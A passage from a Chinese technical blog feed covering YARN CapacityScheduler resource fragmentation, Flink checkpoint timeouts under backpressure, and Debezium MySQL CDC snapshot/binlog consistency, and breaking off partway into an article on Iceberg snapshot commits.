<h2 id="总空闲不等于当前请求能放下"><a href="#总空闲不等于当前请求能放下" class="headerlink" title="总空闲不等于当前请求能放下"></a>总空闲不等于当前请求能放下</h2><p>下面是一个刻意简化的例子：三个节点各剩 6 GB 内存和 1 个 vCore，集群总计还剩 18 GB、3 vCore。一个请求 8 GB、1 vCore 的 Container 仍然无处可放，因为任何单节点都缺少足够内存。</p>
<p>反过来也一样。节点剩余内存充足，但 vCore 被分散占用，4-core Container 会一直等。页面如果只显示集群总资源，会把这种节点碎片伪装成“明明有资源”。</p>
<p>队列容量是另一个边界。CapacityScheduler 的 capacity 是保证容量，在其他队列空闲时可以弹性使用更多资源；<code>maximum-capacity</code> 才限制上界。因此“队列已经超过 100%”不一定是异常，它可能正在借用空闲容量。等保证容量不足的队列重新产生需求，资源会在 Container 自然结束或启用抢占后逐步归还。</p>
<p>排队原因至少要按下面的顺序拆开：</p>
<ol>
<li>ApplicationMaster 是否受 <code>maximum-am-resource-percent</code> 限制，导致应用还在 ACCEPTED；</li>
<li>Container 请求是否超过集群或队列最大分配；</li>
<li>当前 ResourceCalculator 如何比较资源；</li>
<li>队列、用户限制和 maximum-capacity 是否允许继续分配；</li>
<li>是否存在一个具体节点同时满足内存、vCore、标签与本地性条件。</li>
</ol>
<p>把这些问题混成一个“资源不足”，后续只会不断扩大队列 capacity，真正的节点碎片和请求规格却没有变化。</p>
<h2 id="我会保留一份可复算的资源快照"><a href="#我会保留一份可复算的资源快照" class="headerlink" title="我会保留一份可复算的资源快照"></a>我会保留一份可复算的资源快照</h2><p>只截 ResourceManager 页面不够。资源等待会随着 Container 结束迅速变化，过几分钟再看已经不是同一个现场。我更习惯在作业等待时保存一份快照：应用与 attempt 状态、pending resource、每个 Container 的 capability、队列 guaranteed&#x2F;max&#x2F;used&#x2F;pending、各 NodeManager 的 total&#x2F;allocated&#x2F;available，以及调度器资源计算器配置。</p>
<p>有了这些数据，就可以回答一个很具体的问题：在当时那一刻，哪些节点为什么放不下这个请求。是内存少 1 GB、CPU 少 1 core，还是队列&#x2F;用户上限挡住了分配。这个结论可以复算，也能用调整后的参数做对照。</p>
<p>资源治理最后要落到规格收敛。平台允许任意内存和 vCore 组合时，节点很容易被切成大量难以利用的边角。根据机器规格和工作负载沉淀几档常用 Container 形状，比让每个任务自由填写数字更容易提高装箱效率。特殊大内存任务可以进入单独队列和节点池，不必让整个共享集群为少数任务保留碎片。</p>
<p>“队列还有资源”只描述了一个聚合结果。要解释任务为什么在等，必须把资源计算方式、请求规格和节点形状放到同一张图里。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-server/hadoop-yarn-server-resourcemanager/src/main/java/org/apache/hadoop/yarn/server/resourcemanager/scheduler/capacity/CapacitySchedulerConfiguration.java#L213-L219"><code>CapacitySchedulerConfiguration</code>：默认使用 DefaultResourceCalculator</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-common/src/main/java/org/apache/hadoop/yarn/util/resource/DefaultResourceCalculator.java#L39-L50"><code>DefaultResourceCalculator</code>：资源比较与可用 Container 数只考虑内存</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-common/src/main/java/org/apache/hadoop/yarn/util/resource/DominantResourceCalculator.java#L35-L51"><code>DominantResourceCalculator</code>：dominant share 的定义</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-common/src/main/java/org/apache/hadoop/yarn/util/resource/DominantResourceCalculator.java#L403-L415"><code>DominantResourceCalculator.ratio()</code>：取多维资源比例最大值</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-site/src/site/markdown/CapacityScheduler.md#L433-L440">CapacityScheduler 3.3.0 文档：两种 ResourceCalculator 的区别</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-site/src/site/markdown/CapacityScheduler.md#L119-L135">CapacityScheduler 3.3.0 文档：队列容量与单 Container 上限</a></li>
<li><a href="https://github.com/apache/hadoop/blob/aa96f1871bfd858f9bac59cf2a81ec470da649af/hadoop-yarn-project/hadoop-yarn/hadoop-yarn-common/src/main/resources/yarn-default.xml#L404-L437"><code>yarn-default.xml</code>：默认最小与最大分配</a></li>
</ul>
]]></content>
      <categories>
        <category>资源调度</category>
      </categories>
      <tags>
        <tag>YARN</tag>
        <tag>CapacityScheduler</tag>
        <tag>资源治理</tag>
      </tags>
  </entry>
  <entry>
    <title>Flink Checkpoint 为什么总在背压时超时：先区分 barrier 到达和状态落盘</title>
    <url>//2021/06/12/flink-checkpoint-backpressure/</url>
    <content><![CDATA[<p>Flink 作业平时运行正常，一到流量高峰，checkpoint duration 突然从几十秒拉长到超时。第一反应通常是 RocksDB 或 HDFS 写得慢，于是继续调 checkpoint timeout。超时时间变长以后，失败次数可能少了，恢复点却越来越旧，背压也没有消失。</p>
<p>Checkpoint 的端到端时间不只是“状态写入存储”的时间。barrier 从 source 往下游传递，要先穿过已有的数据和网络缓冲；多输入算子还要等各个 channel 的同一轮 barrier 到齐。上游或下游已经背压时，barrier 本身就可能走不动，状态后端甚至还没开始做主要工作。</p>
<p>我排查这类问题时，会先把一次 checkpoint 拆成 start delay、alignment、同步快照和异步落盘四段。只有知道时间花在哪一段，参数调整才有意义。</p>
<p class="article-diagram-scroll"><img src="/images/articles/flink-checkpoint-backpressure.svg" class="lazyload" data-srcset="/images/articles/flink-checkpoint-backpressure.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Flink 背压下 checkpoint 的四段耗时"></p>
<span id="more"></span>

<h2 id="End-to-End-Duration-由最后一个-subtask-决定"><a href="#End-to-End-Duration-由最后一个-subtask-决定" class="headerlink" title="End-to-End Duration 由最后一个 subtask 决定"></a>End-to-End Duration 由最后一个 subtask 决定</h2><p>Flink 1.13.1 的 checkpoint 监控文档对 End to End Duration 的定义很明确：从 JobManager 触发 checkpoint，到最后一个 subtask 返回确认。它通常会大于任意一个 subtask 实际做状态快照的时间。</p>
<p>这句话决定了排查入口。一个拓扑有 200 个 subtask，只要其中一个分区的数据倾斜、外部调用变慢或网络 channel 堵住，整轮 checkpoint 都要等它。看作业级的平均耗时，很容易把那个长尾 subtask 淹没。</p>
<p>我会直接进入 checkpoint details，按 subtask 排序看下面四项：</p>
<table>
<thead>
<tr>
<th>指标</th>
<th>它在回答什么</th>
</tr>
</thead>
<tbody><tr>
<td>Start Delay</td>
<td>barrier 从创建到这个 subtask 收到第一个 barrier，路上等了多久</td>
</tr>
<tr>
<td>Alignment Duration</td>
<td>第一个 barrier 到达后，等其余输入 channel 的 barrier 花了多久</td>
</tr>
<tr>
<td>Sync Duration</td>
<td>operator 同步做状态快照、阻塞正常处理花了多久</td>
</tr>
<tr>
<td>Async Duration</td>
<td>异步写 checkpoint 存储以及相关等待花了多久</td>
</tr>
</tbody></table>
<p>先找同一轮 checkpoint 中最大值落在哪个 subtask，再回到拓扑看它的上下游。只看全局曲线，无法分辨是 barrier 在路上堵住、输入没有对齐，还是状态文件真的写得慢。</p>
<h2 id="Start-Delay-高，说明-barrier-还没到现场"><a href="#Start-Delay-高，说明-barrier-还没到现场" class="headerlink" title="Start Delay 高，说明 barrier 还没到现场"></a>Start Delay 高，说明 barrier 还没到现场</h2><p>Start Delay 是 barrier 创建到 subtask 收到第一个 barrier 的时间。如果 source 附近很低、沿拓扑向下游逐级升高，往往说明数据路径上已有排队，barrier 跟着数据一起被延迟。</p>
<p>这时直接优化 RocksDB 没有依据。可以先对照算子的 busy、backPressured、idle 状态，检查 sink 吞吐、外部系统响应时间、序列化开销和数据倾斜。下游消费不过来，背压会沿数据交换链路往上游传播，所以“哪个算子显示 HIGH”不等于它就是最初的瓶颈。</p>
<p>Flink 1.13.1 Web UI 的背压状态也是采样结果。默认采样 100 次，每次间隔 50 ms；样本中超过一半处于背压才显示 HIGH，而且至少 60 秒后才重新采样。它适合快速定位，不是一条连续、无损的时间线。</p>
<p>我会把 checkpoint 的 trigger time 和外部系统指标对齐。例如 sink 写 Kafka、Elasticsearch 或数据库，就看同一时间段的请求延迟、限流、连接池等待和错误率。若外部写入下降先发生，Flink 背压和 checkpoint start delay 随后上升，因果顺序就比一张 HIGH 截图清楚得多。</p>
<h2 id="Alignment-高，是输入-channel-到达不一致"><a href="#Alignment-高，是输入-channel-到达不一致" class="headerlink" title="Alignment 高，是输入 channel 到达不一致"></a>Alignment 高，是输入 channel 到达不一致</h2><p>Exactly-once 的 aligned checkpoint 中，多输入算子收到某个 channel 的 barrier 后，会阻塞这个 channel，继续等待其他 channel 的同一轮 barrier。监控文档把 Alignment Duration 定义为收到第一个和最后一个 barrier 之间的时间。</p>
<p>源码里的 <code>SingleCheckpointBarrierHandler.processBarrier()</code> 也按这个边界记录：第一个 barrier 到达时标记 alignment start；收到的 barrier 数等于 open channel 数时，标记 alignment end，并完成 <code>allBarriersReceivedFuture</code>。</p>
<p>如果一个 join 或 union 算子的某路输入稳定、另一路严重背压，先到的 channel 会等待慢的一路。alignment time 增长不一定表示这个多输入算子计算慢，它可能只是第一个能观测到两路速度差异的位置。</p>
<p>排查时要把每条输入边分开看：</p>
<ul>
<li>上游 subtask 是否有数据倾斜，某几个分区明显更忙；</li>
<li>两路 source 的吞吐和 watermark 是否出现差异；</li>
<li>网络 buffer 是否长期占满；</li>
<li>慢输入的上游是否被更下游的反压波及；</li>
<li>checkpoint 之间是否没有足够暂停，前一轮还未恢复就触发下一轮。</li>
</ul>
<p>Alignment 是症状出现的位置，不必然是根因所在的位置。沿慢 channel 向上游追到第一个吞吐下降或资源饱和的算子，才算找到入口。</p>
<h2 id="Sync-和-Async-高要分别处理"><a href="#Sync-和-Async-高要分别处理" class="headerlink" title="Sync 和 Async 高要分别处理"></a>Sync 和 Async 高要分别处理</h2><p>Sync Duration 包含 operator 的同步状态快照，这段时间 subtask 不能正常处理记录和 timer。它明显升高时，我会检查状态大小、序列化成本、主线程上的同步工作，以及是否存在单个 key 或单个 subtask 状态特别大。</p>
<p>Async Duration 主要是把 checkpoint 数据写到配置的文件系统。它升高时才重点看 checkpoint 存储吞吐、网络、DataNode 状态、增量 checkpoint 命中情况和同时写入量。即使是异步阶段，长时间占用 IO 和上传线程也会影响下一轮 checkpoint 与正常处理。</p>
<p>状态大小也不能只看作业合计。一个 subtask 的 checkpoint data size 显著高于同并行度其他 subtask，通常值得检查 key 分布。总状态 1 TB 均匀分在 200 个分区，与其中一个分区单独承担 200 GB，恢复和 checkpoint 的长尾完全不同。</p>
<p>我会选择两轮相邻 checkpoint 做对照。一轮在正常流量、一轮在高峰，比较同一 subtask 的 Start Delay、Alignment、Sync、Async 和 Data Size。变量落在哪一段，后续实验就只动对应层面。</p>
<h2 id="Unaligned-checkpoint-不是背压修复开关"><a href="#Unaligned-checkpoint-不是背压修复开关" class="headerlink" title="Unaligned checkpoint 不是背压修复开关"></a>Unaligned checkpoint 不是背压修复开关</h2><p>Flink 1.13.1 可以启用 unaligned checkpoint。在背压严重时，它不等待所有 channel 完成传统对齐，而是把 in-flight data 也纳入 checkpoint。这样能够缩短 barrier 对齐等待，让 checkpoint 更有机会在超时前完成。</p>
<p>代价也在监控字段里：unaligned checkpoint 会出现 Persisted in-flight data，异步阶段还包括等待最后 barrier 和持久化这些数据的时间。网络中积压的数据越多，checkpoint 体积与恢复时需要重放的内容就越多。</p>
<p>因此我把 unaligned 当作容错策略，不把它当吞吐优化。sink 写不动、热点 key、CPU 不足这些根因仍然存在。开启前要用相同负载做对照，至少记录 checkpoint 成功率、端到端耗时、持久化 in-flight data、存储写入量和一次故障恢复耗时。</p>
<p>Flink 1.13.1 的中文配置文档仍把这个功能标为实验性。生产启用时，还要确认作业拓扑、版本与升级路径，不适合只因为一次 checkpoint 超时就在所有任务上全局打开。</p>
<h2 id="Timeout-只决定等多久，不决定为什么慢"><a href="#Timeout-只决定等多久，不决定为什么慢" class="headerlink" title="Timeout 只决定等多久，不决定为什么慢"></a>Timeout 只决定等多久，不决定为什么慢</h2><p><code>setCheckpointTimeout()</code> 控制一轮 checkpoint 最多等待多久；<code>setMinPauseBetweenCheckpoints()</code> 控制成功完成后至少暂停多久；<code>setMaxConcurrentCheckpoints()</code> 决定允许多少轮同时进行。三个参数解决的不是同一件事。</p>
<p>状态确实较大、但耗时稳定时，可以给 timeout 留出合理余量。若 duration 随流量持续上升，单纯放大 timeout 只会让失败晚一点发生。并发 checkpoint 能提高触发机会，也会增加状态后端和存储并发，IO 已经拥塞时可能更糟。最小暂停时间则能避免作业刚完成一轮，马上又进入下一轮快照。</p>
<p>我一般先做一组单变量实验：固定业务输入，保留一轮 checkpoint 并设置最小暂停；定位瓶颈段后，只调整对应的算子并行度、外部 sink 能力、状态分布或 checkpoint 模式。每次实验都记录同一组分位数，不用“这次看起来快了”做结论。</p>
<p>一次 checkpoint 超时可以由很多路径产生。把四段时间拆开后，结论会具体得多：barrier 在到达某个算子之前堵住，某路输入没有对齐，主线程快照太慢，或者状态文件没有及时写完。只有这种结论，才能对应到一个可以验证的修改。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/ops/monitoring/checkpoint_monitoring.md#L70-L87">Flink 1.13.1 Checkpoint 监控：端到端耗时与 in-flight data</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/flink-streaming-java/src/main/java/org/apache/flink/streaming/runtime/io/checkpointing/SingleCheckpointBarrierHandler.java#L193-L241"><code>SingleCheckpointBarrierHandler.processBarrier()</code>：第一个与最后一个 barrier 的处理边界</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/flink-streaming-java/src/main/java/org/apache/flink/streaming/runtime/io/checkpointing/SingleCheckpointBarrierHandler.java#L278-L300"><code>SingleCheckpointBarrierHandler</code>：alignment timeout 的状态切换</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/ops/monitoring/back_pressure.md#L50-L58">Flink 1.13.1 背压监控：采样方式与 HIGH 阈值</a></li>
<li><a href="https://github.com/apache/flink/blob/a7f31926eced15fa2df353b06c71b86c4f9a8e0c/docs/content.zh/docs/dev/datastream/fault-tolerance/checkpointing.md#L84-L102">Flink 1.13.1 Checkpoint 配置：pause、timeout、并发与 unaligned</a></li>
<li><a href="https://github.com/apache/flink/releases/tag/release-1.13.1">Flink 1.13.1 tag 对应提交</a></li>
</ul>
]]></content>
      <categories>
        <category>实时计算</category>
      </categories>
      <tags>
        <tag>Flink</tag>
        <tag>Checkpoint</tag>
        <tag>背压</tag>
      </tags>
  </entry>
  <entry>
    <title>Debezium MySQL CDC 全量快照与增量 Binlog 怎么衔接：一致性边界在哪里</title>
    <url>//2021/07/16/cdc-consistency-boundary/</url>
    <content><![CDATA[<p>CDC 任务第一次启动，通常要先把表里已有的数据读出来，再持续消费 Binlog。产品页面上这件事常被简化成两个阶段：全量完成，切到增量。真正的一致性问题恰好藏在“切”这个字里。</p>
<p>全量扫描可能持续几个小时，这期间业务仍在 INSERT、UPDATE、DELETE。先扫表、扫完以后再记 Binlog 位点，会漏掉扫描期间的变化；先记位点、等全量全部写完再读 Binlog，又必须保证这段日志不会被清理，而且下游能正确处理快照记录与后续变更。</p>
<p>Debezium 1.6.0.Final 的 MySQL connector 给出了一个可读的实现：在短暂锁定期间建立 repeatable read 事务，记录 Binlog 位点和表结构，然后释放全局读锁，在同一一致性视图里继续扫描表。这个位点才是全量与增量的边界。</p>
<p class="article-diagram-scroll"><img src="/images/articles/cdc-consistency-boundary.svg" class="lazyload" data-srcset="/images/articles/cdc-consistency-boundary.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Debezium MySQL 初始快照与 Binlog 衔接"></p>
<span id="more"></span>

<h2 id="边界是一个位点，不是一个完成时间"><a href="#边界是一个位点，不是一个完成时间" class="headerlink" title="边界是一个位点，不是一个完成时间"></a>边界是一个位点，不是一个完成时间</h2><p>MySQL Binlog 按事务提交顺序记录数据和 schema 变化。Debezium 初次启动时先做 consistent snapshot，之后从快照对应的 Binlog 位置继续读取。</p>
<p>这个位置可以理解为时间线上的 P。快照事务读取的是 P 对应的一致性视图；P 之后提交的变化进入 Binlog，由增量阶段回放。只要这两个条件同时成立，扫描表花多长时间都不会凭空制造一个未覆盖区间。</p>
<p>这里最容易写错的是把“全量任务结束时间”当成 P。假设 10:00 开始扫表、12:00 扫完，如果增量从 12:00 的位置开始，10:00 到 12:00 之间已经提交的更新可能既不在早先扫过的行里，也不在增量范围内。一个看似连续的任务，实际缺了两小时。</p>
<p>P 也不能只保存在运行日志。Debezium 会把快照状态和 Binlog 位置放进 connector offset。任务重启后，是否继续增量、是否重新快照，取决于持久化 offset，而不是页面上曾经显示过“全量成功”。</p>
<p>我设计 CDC 平台时，会把 source offset 当成任务结果的一部分展示和审计。对于非 GTID 模式，至少包括 Binlog filename、position 和 row；使用 GTID 时，还要保留 GTID 集合。只有一个“已同步到 99%”的进度条，无法证明边界在哪里。</p>
<h2 id="全局读锁只覆盖确定边界的短阶段"><a href="#全局读锁只覆盖确定边界的短阶段" class="headerlink" title="全局读锁只覆盖确定边界的短阶段"></a>全局读锁只覆盖确定边界的短阶段</h2><p>Debezium 默认 initial snapshot 的流程有明确顺序：</p>
<ol>
<li>获取 global read lock，阻止其他客户端写入；</li>
<li>开启 repeatable read 事务；</li>
<li>读取当前 Binlog position；</li>
<li>读取需要捕获的表结构；</li>
<li>释放 global read lock；</li>
<li>在一致性事务中扫描表并发送 snapshot event；</li>
<li>提交事务，记录快照完成状态。</li>
</ol>
<p>锁的目的不是覆盖整个大表扫描，而是让 Binlog 位点、schema 和一致性视图在同一个边界上建立起来。源码中 <code>determineSnapshotOffset()</code> 执行 <code>SHOW MASTER STATUS</code>，保存 Binlog 文件名、位置和可用的 GTID set；<code>releaseSchemaSnapshotLocks()</code> 在 minimal locking 模式下随后释放全局锁。</p>
<p>这也是为什么不能从“全量扫描需要三小时”直接推断“业务写入会被锁三小时”。全局锁持有多久，要看获取锁、建立事务、读取位点和 schema 的耗时。它仍然会影响在线写入，所以要监控等待锁时间与实际持锁时间，选择业务可接受的窗口。</p>
<p>某些托管 MySQL 不允许 global read lock，Debezium 会退到 table-level lock，并要求 <code>LOCK TABLES</code> 权限。源码还说明了一个麻烦：显式 table lock 场景下，过早 <code>UNLOCK TABLES</code> 会隐式提交活动事务，破坏 consistent snapshot，因此锁释放边界和全局锁不同。上线前只测试 SELECT 与 REPLICATION 权限并不够。</p>
<h2 id="快照期间发生的更新为什么不会丢"><a href="#快照期间发生的更新为什么不会丢" class="headerlink" title="快照期间发生的更新为什么不会丢"></a>快照期间发生的更新为什么不会丢</h2><p>假设账户 42 在 P 时余额为 100。快照事务读到它时，业务已经在 P 之后把余额更新为 80。CDC 输出会包含一条 snapshot read event（余额 100），随后从 Binlog 读到 update event（100 -&gt; 80）。</p>
<p>这两条记录都应该存在。第一条建立 P 时刻的基线，第二条把状态推进到 P 之后。若下游按主键维护最新状态，最终余额是 80；若下游只做无主键 append，又把两条都解释成当前行，就会看见所谓“重复数据”。问题不在 source 多发了一条，而在 sink 没有实现变更语义。</p>
<p>DELETE 更能暴露这个边界。一行在 P 时存在，快照会输出它；P 之后删除，Binlog 再输出 delete。下游若忽略 delete，只会留下幽灵记录。用“全量行数等于目标行数”做最终验收也会误报，因为校验时刻已经发生新的业务事务。</p>
<p>我会先定义下游语义，再谈不重不丢：</p>
<ul>
<li>镜像表按业务主键 upsert，并能处理 delete；</li>
<li>事件明细表保留 operation、source offset 与事务信息；</li>
<li>消费失败重试时，用稳定 event identity 去重；</li>
<li>校验指定同一个 Binlog&#x2F;GTID 水位，不拿两个不同时间的表直接比较。</li>
</ul>
<p>Debezium 的 source metadata 带有 Binlog 文件、位置、row、snapshot 标记等字段，可以用来追踪顺序和识别重放。只拿业务主键做事件去重也不对，同一主键本来就可以连续更新多次。</p>
<h2 id="故障恢复保证的是不漏，可能会重放"><a href="#故障恢复保证的是不漏，可能会重放" class="headerlink" title="故障恢复保证的是不漏，可能会重放"></a>故障恢复保证的是不漏，可能会重放</h2><p>Debezium 文档对异常场景说得很坦白：正常运行和谨慎管理时可以做到每条变更一次；发生故障并恢复时，可能重复部分 change event，此时是 at-least-once。</p>
<p>Kafka Connect 进程突然退出，最近处理的 offset 可能还没来得及持久化。替代 task 从上一次已提交 offset 恢复，会再次生成崩溃前已经发过的一段事件。这不是随机重复，而是“数据已输出、位点未提交”这个故障窗口的必然结果。</p>
<p>初始快照也有自己的恢复边界。文档说明，快照过程中 connector 停止、失败或 rebalance，重启后会重新做一遍 initial snapshot。下游若直接 append，第二次快照会把基线再写一次。消费端必须把 snapshot read 当成可覆盖的当前值，或者用 source identity 保证幂等。</p>
<p>因此我不会把 source connector 的 exactly-once 宣传成整条链路的 exactly-once。source 读取、Kafka 写入、消费者处理、目标端提交是不同事务域。只有每一段的 offset 和数据提交能形成可恢复关系，端到端语义才成立。</p>
<h2 id="Binlog-保留期决定最长恢复窗口"><a href="#Binlog-保留期决定最长恢复窗口" class="headerlink" title="Binlog 保留期决定最长恢复窗口"></a>Binlog 保留期决定最长恢复窗口</h2><p>Connector 从持久化位点恢复的前提，是 MySQL 还保留那个位置之后的 Binlog。任务停止时间超过日志保留期，旧文件被 purge，位点即使还在也无法继续读取。</p>
<p>Debezium 的 <code>snapshot.mode=when_needed</code> 在没有 offset，或原 offset 指向的 Binlog&#x2F;GTID 已不可用时，会重新执行 snapshot。这个行为可以让任务重新启动，却意味着大表再次全量扫描、目标端再次接收 snapshot event。若下游没有幂等能力，自动恢复会把数据问题放大。</p>
<p>保留期应该从恢复目标反推：允许任务最长停止多久，故障发现需要多久，人工处理与补容量需要多久，全量重做又需要多久。只按磁盘大小设置一个很短的 expire 时间，会让一次普通停机变成强制全量。</p>
<p>监控上我至少保留 source 最新位点、MySQL 最早可用位点、两者之间的时间或字节余量。看到 connector lag 还不够，真正危险的是“剩余可恢复窗口”正在变成零。</p>
<h2 id="DDL-与数据必须沿同一时间线解释"><a href="#DDL-与数据必须沿同一时间线解释" class="headerlink" title="DDL 与数据必须沿同一时间线解释"></a>DDL 与数据必须沿同一时间线解释</h2><p>Binlog 不只记录行变化，也记录 DDL。Connector 处理一条旧的 row event 时，不能直接使用数据库当前 schema，因为这条事件可能产生在 ALTER TABLE 之前。</p>
<p>Debezium 将 DDL 与其 Binlog 位置写入 database history topic。重启到某个 offset 时，它回放这个位置以前的 DDL，重建当时的表结构。这个 history topic 是 connector 自用状态，不能把它当成可随时重建的普通日志；文档还要求保证全局顺序，topic partition 数必须为 1。</p>
<p>这解释了另一个常见现象：数据 topic 还在，schema history 丢了，connector 仍可能无法从旧 offset 正确恢复。CDC 备份不能只备业务事件 topic，还要把 connector config、offset 和 schema history 放在一起。</p>
<p>我验收全量转增量时，会做一次受控变更：在快照扫描过程中，对已扫描和未扫描范围各做一组 INSERT、UPDATE、DELETE，记录提交事务与 Binlog 位置；快照完成后检查目标状态，再重启 connector 验证是否重放、是否幂等。这个实验比盯着“全量完成”四个字更接近一致性本身。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/debezium/debezium/blob/c8c5fc4b56bd53b8cdf8a3aa3ca2a9efec26be73/documentation/modules/ROOT/pages/connectors/mysql.adoc#L27-L34">Debezium 1.6 MySQL connector：初始 consistent snapshot 与 Binlog 的关系</a></li>
<li><a href="https://github.com/debezium/debezium/blob/c8c5fc4b56bd53b8cdf8a3aa3ca2a9efec26be73/documentation/modules/ROOT/pages/connectors/mysql.adoc#L297-L344">Debezium 1.6 MySQL snapshot：全局锁、位点、schema 与表扫描顺序</a></li>
<li><a href="https://github.com/debezium/debezium/blob/c8c5fc4b56bd53b8cdf8a3aa3ca2a9efec26be73/debezium-connector-mysql/src/main/java/io/debezium/connector/mysql/MySqlSnapshotChangeEventSource.java#L255-L289"><code>MySqlSnapshotChangeEventSource.determineSnapshotOffset()</code>：读取 Binlog 文件、位置与 GTID</a></li>
<li><a href="https://github.com/debezium/debezium/blob/c8c5fc4b56bd53b8cdf8a3aa3ca2a9efec26be73/debezium-connector-mysql/src/main/java/io/debezium/connector/mysql/MySqlSnapshotChangeEventSource.java#L199-L220"><code>releaseSchemaSnapshotLocks()</code>：全局锁与表级锁的不同释放边界</a></li>
<li><a href="https://github.com/debezium/debezium/blob/c8c5fc4b56bd53b8cdf8a3aa3ca2a9efec26be73/documentation/modules/ROOT/pages/connectors/mysql.adoc#L105-L117">Debezium 1.6 MySQL schema history：按 Binlog 位置恢复历史 schema</a></li>
<li><a href="https://github.com/debezium/debezium/blob/c8c5fc4b56bd53b8cdf8a3aa3ca2a9efec26be73/documentation/modules/ROOT/pages/connectors/mysql.adoc#L2654-L2662">Debezium 1.6 故障语义：恢复期间可能重放事件</a></li>
<li><a href="https://github.com/debezium/debezium/blob/c8c5fc4b56bd53b8cdf8a3aa3ca2a9efec26be73/documentation/modules/ROOT/pages/connectors/mysql.adoc#L2702-L2714">Kafka Connect 崩溃后从旧 offset 恢复会产生重复事件</a></li>
</ul>
]]></content>
      <categories>
        <category>数据同步</category>
      </categories>
      <tags>
        <tag>CDC</tag>
        <tag>Debezium</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Iceberg Snapshot 提交到底原子在哪里：并发写入、重试与未知状态</title>
    <url>//2021/08/21/iceberg-snapshot-commit/</url>
    <content><![CDATA[<p>“Iceberg 支持原子提交”这句话很容易被理解成：两个任务同时写同一张表也不会冲突，失败了自动重试就好。实际边界要窄得多。</p>
<p>Iceberg 的原子点是 table metadata pointer 从旧 metadata file 切换到新文件。数据文件、manifest、manifest list 和新 metadata file 在此之前已经写到存储上；只有 catalog 中的指针成功切换，新 snapshot 才对读者可见。两个 writer 基于同一个旧版本提交时，只能有一个先完成切换，另一个必须刷新表状态、重新验证再尝试。</p>
<p>所以原子性解决的是“读者不会看到半张表”，不是“所有并发操作都会成功”。并发 append、overwrite 和 compaction 的冲突条件不同，失败后的处理也不能统一写成一个无限重试。</p>
<p class="article-diagram-scroll"><img src="/images/articles/iceberg-snapshot-commit.svg" class="lazyload" data-srcset="/images/articles/iceberg-snapshot-commit.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="Iceberg Snapshot 的乐观并发提交"></p>
<span id="more"></span>

<h2 id="数据文件先写，提交只切-metadata-pointer"><a href="#数据文件先写，提交只切-metadata-pointer" class="headerlink" title="数据文件先写，提交只切 metadata pointer"></a>数据文件先写，提交只切 metadata pointer</h2><p>Iceberg 不依赖扫描表目录来决定哪些文件属于表。每个 snapshot 通过 manifest list 找到 manifests，再由 manifest 列出 data file 或 delete file。table metadata file 保存 schema、partition spec、properties、snapshot 历史和 current snapshot 引用。</p>
<p>Writer 执行一批 append 时，先写新的 data files，再为它们生成 manifest 和 snapshot metadata。到这一步，文件已经存在于 HDFS 或对象存储，但当前 table metadata 还没有引用它们，正常 reader 不会把它们读进来。</p>
<p>最后一步才是 commit：把 catalog 中指向 base metadata file 的位置，原子地换成 new metadata file。切换成功后，读者下一次 refresh 才能看到新 snapshot。已经基于旧 metadata 开始规划的查询，仍然使用原 snapshot，不需要和 writer 互相加读锁。</p>
<p>这套设计有两个直接结果。</p>
<p>第一，数据文件的 <code>rename</code> 不是事务边界。对象存储没有 HDFS 那样的原子 rename，也不妨碍 Iceberg 先把不可变文件写到最终路径，再用 catalog 完成指针切换。第二，表目录里出现一个 Parquet 文件，不代表它已经属于表；反过来，绕开 Iceberg 直接删除目录中的文件，可能删掉历史 snapshot 仍在引用的数据。</p>
<p>我在平台上不会用“目录文件数变化”判断 Iceberg 写入是否成功，而是记录 committed snapshot ID、metadata location、added data files 和 operation summary。</p>
<h2 id="两个-Writer-同时提交时发生什么"><a href="#两个-Writer-同时提交时发生什么" class="headerlink" title="两个 Writer 同时提交时发生什么"></a>两个 Writer 同时提交时发生什么</h2><p>假设 Writer A 和 Writer B 都从 metadata v10 开始：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">A: base=v10 -&gt; 写 data/manifest -&gt; 准备 metadata v11-A</span><br><span class="line">B: base=v10 -&gt; 写 data/manifest -&gt; 准备 metadata v11-B</span><br></pre></td></tr></table></figure>

